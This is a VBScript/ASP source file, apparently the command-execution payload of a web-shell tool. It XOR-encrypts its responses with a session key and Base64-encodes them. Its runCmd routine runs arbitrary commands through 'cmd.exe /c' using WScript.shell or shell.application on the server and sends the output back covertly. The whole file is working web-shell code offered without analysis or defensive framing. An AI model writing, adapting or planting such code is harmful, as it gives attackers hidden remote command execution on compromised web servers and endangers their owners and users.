Dim status,message
status="success"

Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function

Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function


Function GetErr(Err)'检查错误处理
	If Err Then
		GetErr= "<font size=2><li>错误:"&Err.Description&"</li><li>错误源:"&Err.Source&"</li><br>"
	End If
End Function
Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function
Function FileRead(FilePath,A)
	on error resume next
	If FilePath<>"" then
		Dim Stream,filecontent,Fso
		If A="Stream" then
			Set Stream=GetStream()
			with Stream
				.type=2
				.mode=3
				.open
				.charset="gbk"
				.LoadFromFile FilePath
				filecontent=.ReadText()
				.close
			End With
			
			Set Stream=Nothing
		Else
			Set Fso=GetFso()
			filecontent=Fso.OpenTextFile(FilePath).ReadAll
			If Err Then 
				status="fail"
				message=GetErr(err)
			End If 
			Set Fso=Nothing
		End If
	FileRead=filecontent
	End If
End Function

Sub runCmd(cmd)
on error resume Next
Dim ws,sa
Set ws=server.createobject("WScript.shell")
If IsEmpty(ws) Then
Set ws=server.createobject("WScript.shell.1")
End If
If IsEmpty(ws) Then
Set sa=server.createobject("shell.application")
End If
If IsEmpty(ws) And IsEmpty(sa) Then
Set sa=server.createobject("shell.application.1")
End If


If Not IsEmpty(ws) Then
Set process=ws.exec("cmd.exe /c "&cmd)
cmdResult=process.stdout.readall
cmdResult=cmdResult&process.stderr.readall
'cmdResult=Replace(cmdResult,vbCrLf,"</br>")
message=cmdResult
End If

If Not IsEmpty(sa) Then
sa.ShellExecute "cmd.exe","/c "&cmd,"","open",0
End If
finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(message)&"""}"
Response.binarywrite(Encrypt(finalResult))
End Sub

Sub main(arrArgs)
cmd=arrArgs(0)
runCmd(cmd)
End Sub
